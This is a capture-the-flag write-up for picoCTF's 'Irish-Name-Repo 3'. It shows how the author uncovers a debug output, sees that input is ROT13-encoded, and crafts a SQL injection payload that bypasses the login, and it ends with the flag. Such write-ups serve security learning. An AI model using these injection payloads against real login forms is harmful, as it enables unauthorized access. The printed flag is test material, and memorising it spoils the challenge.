# Irish-Name-Repo 3

The SQL gets harder here, so we need a new trick. If you look in the inspector, you'll see this field

```html
<fieldset>
    <div class="form-group">
        <label for="password">Password:</label>
        <div class="controls">
            <input 
                type="password" 
                id="password" 
                name="password" 
                class="form-control"
            >
        </div>
    </div>
    <input type="hidden" name="debug" value="1">
    <div class="form-actions">
        <input type="submit" value="Login" class="btn btn-primary">
    </div>
</fieldset>
```
As well as the password input, their's a debug input, hidden and set to `0`. You'll want to set it to `1`

Loging in with the password `test` and debug `1` the server returns
```text
password: test
SQL query: SELECT * FROM admin where password = 'grfg'
```
Somehow the password is being "encrypted", and then fed into a query.

First lets work out what we want the query to be. We'll try the `OR '1'='1'` trick and see if it works. The query should look like

```sql
SELECT * FROM admin where password = '' OR '1'='1'--'
```
This means a post encryption password of `' OR '1'='1'--`.

Let's put this in and see what happens:

```text
password: ' OR '1'='1'--
SQL query: SELECT * FROM admin where password = '' BE '1'='1'--'
```
The `OR` is being transfered to `BE`.

If we try `ABCDEFGHIJKLMNOPQRSTUVWXYZ` we get

```text
password: ABCDEFGHIJKLMNOPQRSTUVWXYZ
SQL query: SELECT * FROM admin where password = 'NOPQRSTUVWXYZABCDEFGHIJKLM'
```

```
ABCDEFGHIJKLMNOPQRSTUVWXYZ
NOPQRSTUVWXYZABCDEFGHIJKLM
```
This looks like [`rot13`](../cryptography/1-13.md)

Therefor to get `OR` we need an input of `BE`, leaving a total password of `' BE '1'='1'--`

This works. The SQL is 
```sql
SELECT * FROM admin where password = '' OR '1'='1'--'
```

Flag: `picoCTF{3v3n_m0r3_SQL_d78e3333}`
